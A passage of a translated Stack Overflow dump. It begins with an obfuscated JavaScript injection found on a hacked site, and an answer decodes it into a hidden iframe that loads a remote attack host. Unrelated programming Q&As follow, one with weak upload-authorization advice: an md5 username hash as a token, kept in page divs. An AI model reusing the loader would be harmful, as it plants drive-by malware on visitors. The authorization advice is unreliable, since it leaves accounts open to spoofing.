f4f73f74f79f66f59f4f70f69f73f63f74f63f69f68f19f-3f55f56f73f69f66f75f74f59f-3f17f60f4f73f74f79f66f59f4f66f59f60f74f19f-3f6f-3f17f60f4f73f74f79f66f59f4f74f69f70f19f-3f6f-3f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f77f63f58f74f62f-3f2f-3f7f6f-3f-1f17f60f4f73f59f74f23f74f74f72f63f56f75f74f59f-2f-3f62f59f63f61f62f74f-3f2f-3f7f6f-3f-1f17f-29f-33f-33f-33f58f69f57f75f67f59f68f74f4f61f59f74f27f66f59f67f59f68f74f73f24f79f42f55f61f36f55f67f59f-2f-3f56f69f58f79f-3f-1f49f6f51f4f55f70f70f59f68f58f25f62f63f66f58f-2f60f-1f17f-29f-33f-33f83'][0].split('f');
    v = "e" + "va";
}
if (v) e = window[v + "l"];
try {
    q = document.createElement("div");
    q.appendChild(q + "");
} catch (qwg) {
    w = f;
    s = [];
}
r = String;
z = ((e) ? h : "");
for (; 573 != i; i += 1) {
    j = i;
    if (e) s = s + r["fromC" + ((e) ? z : 12)](w[j] * 1 + 42);
}
if (v && e && r && z && h && s && f && v) e(s); 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-05-18T18:55:20.620

我看了这段代码，有点疯狂。

它以 开头`try{avasv = prototype;}`，显然失败了。然后它会产生一些变量。

`f`是一个数字数组（长度为 573）。 `z`是`harCode`。接近尾声，有`"fromC" + ((e) ? z : 12)`。这将创建`fromCharCode`( `String.fromCharCode`)，它与数字数组一起使用`f`（在添加`42`到每个数字之后）。这似乎创建了一个要`eval`编辑的字符串。

它`eval`是这样编辑的：

```
v = "e" + "va";
if (v) e = window[v + "l"]; 
```

正如你所看到`e`的`window['eval']`，或者简单地说`eval`。

所以，如果你更换：

```
if (v && e && r && z && h && s && f && v) e(s); 
```

和：

```
if (v && e && r && z && h && s && f && v) console.log(s); 
```

然后，您可以看到这段代码的目的是什么。我这样做了，这是输出的内容：

```
if (document.getElementsByTagName('body')[0]) {
    iframer();
} else {
    document.write("<iframe src='http://kyubdyyyb.lookin.at/?go=2' width='10' height='10' style='visibility:hidden;position:absolute;left:0;top:0;'></iframe>");
}

function iframer() {
    var f = document.createElement('iframe');
    f.setAttribute('src', 'http://kyubdyyyb.lookin.at/?go=2');
    f.style.visibility = 'hidden';
    f.style.position = 'absolute';
    f.style.left = '0';
    f.style.top = '0';
    f.setAttribute('width', '10');
    f.setAttribute('height', '10');
    document.getElementsByTagName('body')[0].appendChild(f);
} 
```

我不知道是什么`http://kyubdyyyb.lookin.at/?go=2`，所以*我建议你**不要**去那里*。

这里似乎有很多多余的检查（比如`(e) ? z : 12`，`e`永远不会是假的）。可能只是为了让代码更混乱。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-05-18T18:51:29.463

我知道这不是一个直接的答案，但看起来已经实现了他们想要做的事情。注入将在您的网站上运行的任意脚本，以执行恶意操作。

谷歌搜索“avasv=prototype”基本上只是列出了大量受感染的站点，但少数看起来没有恶意的点击表明这是一个脚本解包程序。

他们试图达到的目标并不重要。他们做到了。他们在您的 Web 应用程序中放置了一个恶意脚本，然后从那里，他们可以从您的服务器和访问者中窃取敏感数据，并且感谢 XmlHttp，将其发布回他们自己的 Web 服务器。重要的是您将如何在更多访问者受到威胁之前对其进行清理，以及您将如何编写代码以防止未来出现 XSS 和 XSRF。

希望您有源代码控制，并且可以将您的站点恢复到预感染状态。那将是第一件事。

如果您还没有听说过，我强烈建议您定期访问并在[http://www.OWASP.org](http://www.OWASP.org)上学习，这是学习如何预防未来发生的绝佳方式。

* * *

***最后一点，即使您的网站中没有敏感数据，如果您的客户登录到您的网站，您仍然会面临风险。***

JavaScript 可以潜在地用于收集他们的用户名/密码组合，然后他们可以将其用于其他站点并可能从*这些*站点窃取客户的信息。（取决于您的网站的编码方式）因此，清理和保护您的访问者绝对是第一要务，即使这意味着关闭您的网站进行“维护”

![头几次发生这种情况会很有趣。](../Images/b8b8ae128e803f23a3cbdcabb025571b.png)

最后，谷歌在他们的文章“[我的网站被黑客入侵了。现在怎么办？”中有一些很好的建议。](http://googlewebmastercentral.blogspot.com/2008/04/my-sites-been-hacked-now-what.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-27T23:29:18.453

我也得到了这个小动物，它有一段时间令人困惑，因为 grepping 识别像 avasv=prototype 这样的字符串会产生一些结果，但删除它们并不能清除感染。为了澄清 OP，事实证明它最初是在注入一些更有趣的 PHP，通常在 index.php 文件中。你会在第 1 行看到一个 php eval(base64_decode(...)) 。

这段代码的作用是解码和评估一个包含一些 php.ini 的 base64 字符串，我不会费心重新发布，因为它很简单。该代码内部是一个基本的 UA 检查器，它查找不可感染的浏览器/操作系统组合（mac、linux、google chrome 浏览器等）的字符串并搜索蜘蛛/机器人。这也是如果您尝试查看某些浏览器/操作系统组合或使用 curl/wget 时不会看到恶意 javascript 的原因。如果它没有找到列出的 UA 字符串之一，它会解码并回显在 OP 中看到的脚本，该脚本也是 base64 编码的。

所以你想要根除它的是 grep for "eval(base64_decode("。我能想到的特定功能组合没有合法目的，所以你应该能够很快找到它并擦除它当然，这并不能解决您最初的感染点。

# sql-server - 无法添加新列（关键字“COLUMN”附近的语法不正确）

> ID：10658075
> 
> 赞同：6
> 
> 时间：2012-05-18T18:42:45.467
> 
> 标签：sql-server, alter-table

当我运行这个

```
ALTER TABLE agency
ADD COLUMN single_word varchar(100) 
```

我明白了

> 消息 156，级别 15，状态 1，行 2
> 关键字“COLUMN”附近的语法不正确。

我尝试删除`COLUMN`但仍然相同的问题。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-18T18:47:00.113

对于 TSQL Flavor，请尝试以下语法：

```
ALTER TABLE agents
ADD [associated department] varchar(100) 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-03-24T19:52:26.883

在 HeidiSQL 上运行该查询时，我遇到了同样的问题。解决方法很简单，把查询改成这样：

```
ALTER TABLE "agency"
ADD "single_word" varchar(100) 
```

只需删除“COLUMN”关键字。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-18T18:47:22.133

根据您使用的数据库软件，如果您想在列名中有一个空格（我建议不要这样做），您将不得不对其进行转义。

例如，在 MySQL 中，您将使用反引号（键盘顶部数字 1 左侧的字符）：

```
ALTER TABLE agents
ADD COLUMN `associated department` varchar(100); 
```

对于 SQL Server，您可以使用`[]`，而对于大多数其他 DBMS，双引号 ( `"`) 将转义标识符

# php - 授权用户上传

> ID：10658076
> 
> 赞同：0
> 
> 时间：2012-05-18T18:42:45.340
> 
> 标签：php, javascript, jquery, session, uploadify

我网站的一部分允许用户上传文件。这些文件不会上传到网站托管的服务器（比如说`site.com`），而是上传到`s1.site.com`等`s2.site.com`。这些子域指向与主服务器不同 IP 地址的服务器。我正在使用 Uploadify jQuery 插件进行文件上传。

现在，当用户登录并上传文件时，我希望上传的文件出现在“文件”下的帐户页面中。我被困在最好的方法是什么。

我可以为 Uploadify 设置选项，以便在上传的同时发送额外的 POST 数据。简单的解决方案是将上传文件的用户的用户名与文件上传一起发送，但是其他用户可以欺骗他们的用户名并将文件上传到其他人的帐户。不酷。所以我需要一种方法来告诉哪些用户正在上传文件，同时停止用户名欺骗。

我考虑过将用户会话作为 POST 数据发送，有点像这样：

```
$('#file_upload).uploadify({
    formData : { '<?php echo session_name();?>' : '<?php echo session_id();?>' }
}); 
```

但我对会话一无所知。CodeIgniter 正在处理我的用户登录。这行得通吗？有人可以向我解释一下我将如何去做吗？

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T18:57:28.393

我喜欢做一些事情，比如使用[md5 散列](http://www.php.net/manual/en/function.md5.php)来根据用户名创建一个唯一的散列值。一旦用户第一次创建了他或她的帐户，我就会这样做。然后我将该哈希值存储在名为`hash_validation`.

接下来，我将（在用户登录时（为此使用 CodeIngiter））为哈希值创建一个会话变量。然后，出于安全目的，我可以对照表和用户名检查哈希值。这很简单 ->

```
$_SESSION['hash_value'] = $row['hash_validation']; //general example of grabbing the row we created 
```

我喜欢将我的 SESSION 值隐藏在页面上的 div 中，这样我就可以使用 JavaScript 不断地引用它们，而无需与服务器通信。

完成上述所有操作后，我们可以使用该`formData`方法将哈希值发送到服务器（无需像上面那样使用 php。）然后服务器可以根据现有哈希值检查该用户名的哈希值表，如果正确，我们将上传文件。

# javascript - 使用 jquery 函数添加/删除类

> ID：10658077
> 
> 赞同：2
> 
> 时间：2012-05-18T18:42:47.157
> 
> 标签：javascript, jquery, class, function

我有这个代码。

CSS

```
body {
    font-family:Verdana, Geneva, sans-serif;
    font-size:14px;
}

.slidingDiv {
    height:300px;
    background-color: #99CCFF;
    padding:20px;
    margin-top:10px;
    border-bottom:5px solid #3399FF;
}

.show_hide {
    display:none; 
} 
```

HTML

```
<a href="#" class="show_hide">Show/hide</a>
<br />
<div class="slidingDiv">
    Fill this space with really interesting content.
    <a href="#" class="show_hide">hide</a>
</div> 
```

JS

```
$(document).ready(function(){
    $(".slidingDiv").hide();
    $(".show_hide").show();
    $('.show_hide').click(function(){
        $(".slidingDiv").slideToggle();
    });
}); 
```

有人告诉我是否可以在这个 jquery 函数中添加，如果我点击它，同时显示/隐藏一个新的 div，将一个类更改为一个标签并从另一个标签中删除另一个类？我该怎么做？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-18T18:44:20.737

是的，你可以，看看方法[addClass](http://api.jquery.com/addClass/)和[removeClass](http://api.jquery.com/removeClass/)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-18T18:56:27.527

**remove** : `jQuery('element').removeClass('class');` [reference](http://api.jquery.com/removeClass/)
**add** : `jQuery('element').addClass('class');` [reference](http://api.jquery.com/addClass/)

并且可以使用toggleClass进行切换。
**切换**：`jQuery('element').toggleClass('class otherClass');` [参考](http://api.jquery.com/toggleClass/)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-18T18:45:19.790

添加类：

```
$('selector').addClass('className'); 
```

删除类：

```
$('selector').removeClass('className'); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-18T18:46:31.833

是的，当然您可以添加或删除课程

```
<script type="text/javascript">
$("#ButtonId").click(function () {
    $('#itemid').removeClass('classname');
    $('#itemid').addClass('classname');
});
</script> 
```

# c# - C# ODP.NET 加载文件或程序集

> ID：10658078
> 
> 赞同：11
> 
> 时间：2012-05-18T18:42:49.150
> 
> 标签：c#, .net, oracle, odp.net

我最近开始在使用 ODP.NET (Oracle.DataAccess 4.112.3) 的 C# (4.0) 应用程序上进行测试

我将此项目设置为针对任何平台并发布应用程序。

当我在客户端机器上运行程序时，我收到：

```
Could not load file or assembly 'Oracle.DataAccess, Version=4.112.3.0,Culture=neutral,
PublicKeyToken=89b483f429c47342' or one of its dependencies. An attempt was made to load 
a program with an incorrect format. 
```

就像我说的那样，我的目标是“任何 CPU”，并且我还在应用程序中嵌入了 Oracle.DataAccess 程序集。
我在安装了 Oracle 客户端的机器以及未安装的机器上收到此错误。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-05-18T18:48:48.957

> 就像我说的那样，我的目标是“任何 CPU”

这很可能是问题所在。

Oracle.DataAccess 具有用于[32 位](http://www.oracle.com/technetwork/database/windows/downloads/index-101290.html)和[64 位](http://www.oracle.com/technetwork/database/windows/downloads/index-090165.html)系统的不同版本。如果您在 32 位机器上进行开发，然后在 64 位操作系统上进行部署，您将收到此消息。

您可以通过构建以 x86 为目标的应用程序并部署 32 位版本的数据访问组件来轻松解决此问题。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-18T19:02:03.320

As Reed Copsey said, there are two different DLLs. When you target ANYCpu, your app will run in 64 bit on a 64 bit machine, and 32 bit on a 32 bit machine. Therefore, if you want your app to work on 32 or 64 bit *and* run in AnyCPU mode, you should change the reference of Oracle.DataAccess to Specific Version=false and copy local = false. When you deploy to a client, they *should* have the oracle dll in the their GAC and it should pick up the correct version automagically.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T18:47:31.507

您或许应该检查 Oracle.DataAccess 程序集在您的机器中是否有任何依赖关系，并且它在客户端机器中是否缺失。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-03-21T08:24:38.210

从顶部的 debug Any cpu 将 optin 更改为 debug X64，尽管在内部 Any CPu 仅指向 X64 但这不起作用，尝试将其更改为 x64，它应该像魅力一样工作

# javascript - 构建 phonegap 应用程序时的基础资产线

> ID：10658082
> 
> 赞同：0
> 
> 时间：2012-05-18T18:43:24.357
> 
> 标签：javascript, html, cordova

首先，我的 html 在服务器上相对定位东西。我是否需要将这些更改为完整的网址，以便它知道我不是指本地主机？

您在应用程序中打包的内容与从服务器获取的内容之间的界限在哪里？你是否打包了所有的 JS 和 CSS。你有时也从服务器抓取脚本吗？您是否打包图像并动态抓取一些图像？

在开始将 Web 应用程序移植到电话间隙时，还有什么其他要记住的事情吗？只是很难弄清楚线通常在哪里绘制到资产。

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T18:48:05.580

您是否关心当您的用户从他的手机失去与互联网的连接时会发生什么？如果没有，那么您可以从服务器引用 CSS 和图像。但是，如果您使用 jquery 的最小版本，您可以将其全部嵌入到您的应用程序中，然后您就不必担心缺乏连接性。

# asp.net-mvc-3 - 使用 MVC3 WebGrid - 列不存在错误

> ID：10658089
> 
> 赞同：2
> 
> 时间：2012-05-18T18:43:50.430
> 
> 标签：asp.net-mvc-3, webgrid

我收到此错误 - System.InvalidOperationException：列“UserID”不存在。

这是我的视图模型。

```
public class UserVM
{
    public int UserID;
    public string Name;
} 
```

这是我在控制器中的操作方法。

```
public ActionResult TestGrid()
{
    List<UserVM> rows = new List<UserVM>();
    rows.Add(new UserVM { UserID = 100, Name = "Abc" });
    rows.Add(new UserVM { UserID = 101, Name = "Def" });
    rows.Add(new UserVM { UserID = 102, Name = "Ghi" });
    return View("TestGrid", rows.AsEnumerable());
} 
```

这是我的看法。

```
@model IEnumerable<Module.ViewModels.UserVM>
@{
    var grid = new WebGrid(Model);
}

<div>
@grid.GetHtml(
    columns: grid.Columns(
        grid.Column("UserID", header: "User ID"),
        grid.Column("Name", header: "Name")
    )
)
</div> 
```

而已。知道为什么我会收到错误吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-18T23:26:08.890

您的 UserVM 类使用字段而不是属性。不适用于 webgrid。
这是您的具有属性的类：

```
public class UserVM
{
    public int UserID { get; set; }
    public string Name { get; set; }
} 
```

# iframe - 我可以将客户的 Google 分析代码放入在我的网站上运行的 iframe 广告中吗？

> ID：10658092
> 
> 赞同：1
> 
> 时间：2012-05-18T18:44:11.100
> 
> 标签：iframe, google-analytics, subdomain, reporting

我可以将客户的 Google 分析代码放入在我的网站上运行的 iframe 广告中吗？

新手在这里...客户希望从 iframe 广告中进行一些跟踪。我已经创建了 iframe 并将其托管在我的一个服务器上的实用程序目录/子域中。

由于报告在我的服务器上，因此有什么建议或我应该避免的关于报告的事情吗？

# django - Django 和 mongo 真的是无模式的

> ID：10658093
> 
> 赞同：0
> 
> 时间：2012-05-18T18:44:13.563
> 
> 标签：django, database-design, mongodb, database-schema

我必须用 django 和 mongo 编写一个网络应用程序。我选择了mongoengine。我的数据库只有一个带有很多键的集合，这可以改变，所以我定义了一个模型，比如：

```
from django.db import models  

class Article(models.Model):  
    title = models.CharField(max_length = 64)  
    content = models.TextField() 
```

真的很难。而且我认为如果我必须写一个像上面这样的模式模型，它不是一个真正的模式少集成，因为我必须写下所有的属性。有什么提示吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:50:34.907

来自 mongoengine 文档：

> MongoDB 是无模式的，这意味着数据库不会强制执行任何模式——我们可以随意添加和删除字段，MongoDB 不会抱怨。这在许多方面使生活变得更加轻松，尤其是在数据模型发生更改时。但是，为我们的文档定义模式可以帮助消除涉及不正确类型或缺少字段的错误，并且还允许我们以与传统 ORM 相同的方式在文档上定义实用方法。

[http://readthedocs.org/docs/mongoengine-odm/en/latest/tutorial.html](http://readthedocs.org/docs/mongoengine-odm/en/latest/tutorial.html)

我的提示是尽可能使用数据模型，当你不能使用时不要使用它们

# asp.net - asp.net 中的自定义授权和页面保护

> ID：10658095
> 
> 赞同：0
> 
> 时间：2012-05-18T18:44:21.650
> 
> 标签：asp.net, webforms

需要解决自定义授权问题。我的数据库中已经有四个名为： 1\. Usermaster 2.Roles 3.RoleMenu 4.Menu

我已经实现了这一点并且它工作得很好。我现在唯一的问题是，经过身份验证的用户只需在浏览器中输入页面 url 即可查看未经授权的页面。

除了表单身份验证和文件夹级别访问之外，还有什么有用的想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T18:48:03.517

我有一个类似的项目，我似乎无法在任何地方找到代码，因为它是很久以前的。不过我记得前提。我所做的是我在 webconfig 中设置了一个密钥，该密钥允许在管道分隔的字符串中访问用户名。在代码后面，我会拉入该密钥以及尝试访问该页面的用户。然后我会搜索字符串并尝试匹配用户。如果找到匹配项，则页面将加载，如果未找到匹配项，则会将他们重定向到一个页面，告诉他们他们没有访问权限以及联系谁来请求访问权限。如果我找到它，我会查找代码并进行编辑。

编辑

网络配置

```
<appSettings>
    <add key="Users" value="user1|user2|user3|..." />
</appSettings> 
```

这件作品高于

对于 .aspx.vb 页面

```
Dim DomainUserName() As String = Request.ServerVariables("LOGON_USER").Split("\")
    Dim UserName As String = DomainUserName(1)

    Dim Users() As String = ConfigurationManager.AppSettings("Users").ToString.Split("|")

    Dim isAllowedAccess As Boolean = False

    For i As Integer = 0 To Users.Count - 1
        If UserName = Users(i) Then
            isAllowedAccess = True
            Exit For
        End If
    Next

    If isAllowedAccess = False Then
        Response.Redirect("Default.aspx")
    End If 
```

本质上，我们的登录名是域\用户名，所以我正在做的是使用拆分仅提取名称。然后，我将接受的用户填充到管道上拆分的数组中，并循环遍历它们以搜索匹配项。当找到匹配项时，它允许他们访问，如果没有找到匹配项，他们将被重定向回主页。

# jquery - 在一个 asp.net mvc html 文件中设置多个 jquery 对话框

> ID：10658099
> 
> 赞同：0
> 
> 时间：2012-05-18T18:44:43.950
> 
> 标签：jquery, asp.net-mvc, jquery-ui-dialog, jquery-dialog

在我的索引视图中，我有一个创建和打开模板链接：

```
@Html.ActionLink("Create Template", "JsonCreate", "Template", new { id = "CreateTemplate" })
@Html.ActionLink("Open Template", "JsonOpen", "Template", new { id = "OpenTemplate" })

<script type="text/javascript">

   $(function () {
        $('#dialog').dialog({
            autoOpen: false,
            width: 300,
            resizable: false,
            title: 'Create Template',
            hide: "fade",         
            show: "fade",
            modal: true,
            open: function(event, ui) {               
                $(this).load("@Url.Action("Create")");
            },
            buttons: {
             "Save": function () {                      
                        var form = $('form', this);
                        $(form).submit();
                     },
                "Close": function () {
                    $(this).dialog("close");
                }
            }
        }); 

        $('#OpenTemplate').click(function ()
        {
            $('#dialog').dialog('open');
            return false;
        });

        $('#CreateTemplate').click(function ()
        {
            $('#dialog').dialog('open');
            return false;
        });
    });

</script> 
```

对于打开模板链接，我想要一个完全不同的对话框：

*   其他按钮
*   其他尺寸
*   其他头衔
*   ETC...

我需要改变什么，我的打开模板链接可以使用相同的对话框 div“#dialog”打开它自己的对话框？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T19:04:48.767

过去我曾尝试为多个不同的对话框重新使用单个 div，我强烈建议只创建一个新 div 和一个新的 ui.dialog 实例。它在 body 标记的底部添加了额外的 html，但这是为了清楚地分离 javascript 代码而付出的小代价。如果您需要在对话框 div 中使用不同的 HTML，那么绝对没有理由不**使用两个完全独立的 div**。这样做会为您节省大量时间和精神上的痛苦。

如果你选择不听这个建议，我建议创建两个配置对象并在关闭时销毁对话框实例。像这样的东西：

```
$(function () {
    var baseConfig = {
        autoOpen: false,
        resizable: false,
        hide: "fade",
        show: "fade",
        modal: true,
        close: function(event, ui) {
            $(this).dialog('destroy');
        },
        buttons: {
            "Save": function () {
                var form = $('form', this);
                $(form).submit();
            },
            "Close": function () {
                $(this).dialog("close");
            }
        }
    }
    var createConfig = {
        width: 300,
        title: 'Create Template',
        open: function(event, ui) {               
            $(this).load("@Url.Action("Create")");
        }
    }
    var openConfig = {
        width: 500,
        title: 'Open Template',
        open: function(event, ui) {               
            $(this).load("@Url.Action("Open")");
        }
    }

    $('#OpenTemplate').click(function ()
    {
        var config = $.extend(baseConfig, openConfig);
        $('#dialog').dialog(config);
        return false;
    });

    $('#CreateTemplate').click(function ()
    {
        var config = $.extend(baseConfig, createConfig);
        $('#dialog').dialog(createConfig);
        return false;
    });
}); 
```

这只是一种解决方案。可能有其他方法可以在不破坏对话框的情况下做到这一点，但相信我，当我说这会更干净时。同样，这个 div 重用解决方案假定 div 内的 HTML**完全没有变化**。

# haskell - 使用 FFI 声明时的 GHCi 运行时链接器问题

> ID：10658104
> 
> 赞同：50
> 
> 时间：2012-05-18T18:44:59.167
> 
> 标签：haskell, linker, ffi, ghci

我对 Haskell 中的 FFI 和 GHC的交互模式有疑问[。](https://stackoverflow.com/questions/10123040/ghci-doesnt-work-with-ffi-export-declarations-shared-libaries)

考虑`FFISo.hs`：

```
{-# LANGUAGE OverloadedStrings #-}
module Main where

import qualified Data.ByteString.Char8 as B

import FFIFun.Foo

main :: IO ()
main = do
  B.putStrLn "main"
  callMeFromC
  callMeFromHaskell
  return () 
```

`c.c`：

```
#include <stdio.h>

void callMeFromC(void);

void callMeFromHaskell(void)
{
    printf("callMeFromHaskell\n");
    callMeFromC();
} 
```

`FFIFun/Foo.hs`：

```
{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE ForeignFunctionInterface #-}
module FFIFun.Foo where

import qualified Data.ByteString.Char8 as B

foreign import ccall "callMeFromHaskell"
  callMeFromHaskell :: IO ()

foreign export ccall callMeFromC :: IO ()
callMeFromC :: IO ()
callMeFromC = B.putStrLn "callMeFromC" 
```

和一个`Makefile`：

```
SHELL := bash

GHC_OPT := -Wall -O2 -fno-warn-unused-do-bind

all: ffiso

test: ffiso
    ./$<

ffiso: FFISo.hs c.c
    ghc --make $(GHC_OPT) $^ -o $@

clean:
    rm -rf *{.hi,o,_stub.*} ffiso FFIFun/*{.hi,.o,_stub.*}

ghci: ffiso
    ghci -package bytestring FFIFun/Foo.o c.o FFISo.hs 
```

您也可以在这里找到它[作为要点](https://gist.github.com/2724649)。

所以，我现在的问题：

```
$ make ghci
[...]
Ok, modules loaded: Main, FFIFun.Foo.
Prelude Main> -- fine, it's loading.
Prelude Main> :t callMeFromC

<interactive>:1:1: Not in scope: `callMeFromC'
Prelude Main> -- uhm, why?
Prelude Main> :t main
main :: IO ()
Prelude Main> main

GHCi runtime linker: fatal error: I found a duplicate definition for symbol
   FFIFunziFoo_callMeFromC_info
whilst processing object file
   ./FFIFun/Foo.o
This could be caused by:
   * Loading two different object files which export the same symbol
   * Specifying the same object file twice on the GHCi command line
   * An incorrect `package.conf' entry, causing some object to be
     loaded twice.
GHCi cannot safely continue in this situation.  Exiting now.  Sorry. 
```

hrmpf，这里有什么问题吗？有趣的是，我得到了一个不同的错误`i686`（上面，它是一个`x86_64`系统，但都是 GHC 7.4.1）：

```
GHCi runtime linker: fatal error: I found a duplicate definition for symbol
   __stginit_FFIFunziFoo
whilst processing object file
   ./FFIFun/Foo.o
This could be caused by:
   * Loading two different object files which export the same symbol
   * Specifying the same object file twice on the GHCi command line
   * An incorrect `package.conf' entry, causing some object to be
     loaded twice.
GHCi cannot safely continue in this situation.  Exiting now.  Sorry. 
```

另外，是否有一些关于它的文档？我觉得我是唯一一个在 FFI 和 GHCi 方面遇到困难的人。

编辑：注意，`make test`效果很好：

```
$ ghc --make -Wall -O2 -fno-warn-unused-do-bind FFISo.hs c.c -o ffiso
[1 of 2] Compiling FFIFun.Foo       ( FFIFun/Foo.hs, FFIFun/Foo.o )
[2 of 2] Compiling Main             ( FFISo.hs, FFISo.o )
Linking ffiso ...
./ffiso
main
callMeFromC
callMeFromHaskell
callMeFromC 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T14:20:52.860

这是字节码解释器 GHCi 中动态链接目标文件[的已知限制](http://www.haskell.org/haskellwiki/GHC%3aFAQ#Duplicate_Definitions)。

如果您加载静态链接到给定 C 对象的编译代码，然后还即时解释一些也通过 FFI 引用同一 C 对象的 Haskell，运行时链接器将被迫动态加载 C 对象。

现在您的地址空间中有两个版本的 C 符号，然后出现故障。

您必须在 GHCi 模式下解释所有内容，或者在此过程中放弃使用 GHCi。对于某些操作系统链接器，您可以通过动态表（`-x`标志）公开静态链接的符号表。

# jquery - jQuery $(this) 优化

> ID：10658105
> 
> 赞同：1
> 
> 时间：2012-05-18T18:45:01.907
> 
> 标签：jquery, optimization

> **可能重复：**
> [“$(this)”的成本是多少？](https://stackoverflow.com/questions/10433014/what-is-the-cost-of-this)

我经常在一些开发人员代码中看到`$(this)`可能存在 3-5 次引用同一个 dom 节点的位置。我想知道在什么时候值得优化和存储在变量中`var el = $(this);`？

有谁知道有关此性能的可靠文档来源？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T18:47:13.780

如果您必须多次使用它，请将其缓存。恕我直言，为什么要一直调用 DOM 呢？

注意：我建议`$`在实际上是 jquery DOM 元素的变量之前添加一个。它使跟踪变量的真正含义变得更加容易。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-18T18:47:30.957

我用`var $this = $(this);`

本文提供性能分析。10,000 次通话后，您将节省 1 秒 :) [http://www.stoimen.com/blog/2010/06/19/speed-up-the-jquery-code-selectors-cache/](http://www.stoimen.com/blog/2010/06/19/speed-up-the-jquery-code-selectors-cache/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-18T18:53:21.547

如果你将它缓存在一个变量中，它的类型也更少，但也可以通过缩小器进行优化，因为`$(this)`不能缩小，而引用的局部变量`$(this)`可能会缩小为一个字符

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-05-18T18:50:48.100

这意味着它只是标记事件的元素。

```
$("input").click(function(){
  $(this)// this refer to the input element that you click
}) 
```

当我们需要存储这个元素时，我们使用一个变量来存储它。所以 var el = $(this) 的 el 也表示输入元素。

# css - 我的 DIV 宽度没有随着其子项的大小而扩大

> ID：10658109
> 
> 赞同：0
> 
> 时间：2012-05-18T18:45:19.193
> 
> 标签：css, html, width

我有一个 1000px 的父 div（导航）。其中有一个子 div (nav-drop-panel)，并且在其中有另一个子 (drop-panel-col)。基本上，drop-panel-col 是导航中的链接列表。由于有一个特定的高度，我只能在添加另一列之前添加这么多链接（所以在 nav-drop-panel 中有 1-4 个 drop-panel-col div）。

我希望 nav-drop-panel div 根据其中的列数自行调整大小。因此，如果只有一个，它会比有 4 个小。它永远不会超过甚至接近其父 div (nav) 的 1000px 宽度。出于某种原因，如果我没有将 nav-drop-panel 设置为特定宽度（这使得它对于一列来说太大了），它会为自己分配一个任意宽度，并且我的所有列都被向下推，看起来很糟糕。

我已经尝试了一些其他相关问题的解决方案，但到目前为止没有任何效果。

我的 HTML：

```
<div class="nav-drop-panel">
    <div class="drop-panel-col">
        <a class="cat">Vehicle Graphics</a>
        <a href="/info_truck_graphics.php">Pick-Up Truck</a>
        <a href="/info_van_lettering.php">Van</a>
        <a href="/info_trailer_graphics.php">Enclosed Trailer</a>
        <a href="/info_commercial_truck_graphics.php">Box Truck</a>
        <a href="/info_suv_graphics.php">SUV</a>
        <a href="/car-lettering.php">Car</a>
        <a href="/info_boat_graphics.php">Boat</a>
        <a href="/info_bus_graphics.php">Bus</a>
        <a href="/custom-signs/magnetic-car-signs-vehicle-magnet-sign/">ScratchGuard&#153; Magnets</a>
        <a href="/info_vinyl_Letters.php">Vinyl Lettering and Graphics</a>
        <p></p>     
    </div>
</div> 
```

我的 CSS：

```
#nav {
    padding: 0;
    margin: 0;
    list-style: none;
    width: 1000px;
    z-index: 15;
    font-family: Verdana,Arial,Helvetica,sans-serif;
    /* position: absolute;
    left: 0px;
    top: 0px; */
}
#nav .nav-drop-panel {
    background-color: #FFFFFF;
    border-bottom: 3px solid #BBBBBB;
    border-bottom-right-radius: 10px;
    border-right: 3px solid #BBBBBB;
    height: 431px;
    margin-bottom: 0;
    padding-bottom: 7px;
    padding-top: 19px;
    /* position: absolute;
    top: -5px;
    left: 218px; */
}

#nav .drop-panel-col {
    color: #333333;
    float: left;
    font-family: Arial;
    font-size: 14px;
    padding-left: 24px;
}

#nav .drop-panel-col a{
    color: #333333;
    display: block;
    font-weight: bold;
    height: 19px;
    margin-bottom: 5px;
    margin-left: -4px;
    padding-left: 30px;
    padding-top: 0;
    width: 202px;
} 
```

非常感谢任何帮助或想法，谢谢。:)

编辑：只是显示我做了什么来删除定位。我刚刚评论了它，看看它是否至少会扩展，并从那里开始工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T18:49:48.647

绝对定位的元素**不再是布局的一部分**。父元素不知道它们在哪里或有多大。

您需要使用 JavaScript 来计算所有这些并相应地调整父级的大小......或者使用不使用绝对定位的布局。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T20:36:50.613

添加`display: inline-block;`到 .nav-drop-panel[似乎可以解决问题](http://jsfiddle.net/2M2VN/5/)；我还稍微减少了打印代码（`margin-left`，，`margin-top`等减少到`margin: etc etc etc etc;`）。要查看您未更改但可以正常工作的版本（就像`display: inline-block;`添加的版本一样），请单击[此处](http://jsfiddle.net/ZMDjH/1/)。

# java - 局部变量、对象引用及其内存分配

> ID：10658111
> 
> 赞同：5
> 
> 时间：2012-05-18T18:45:22.130
> 
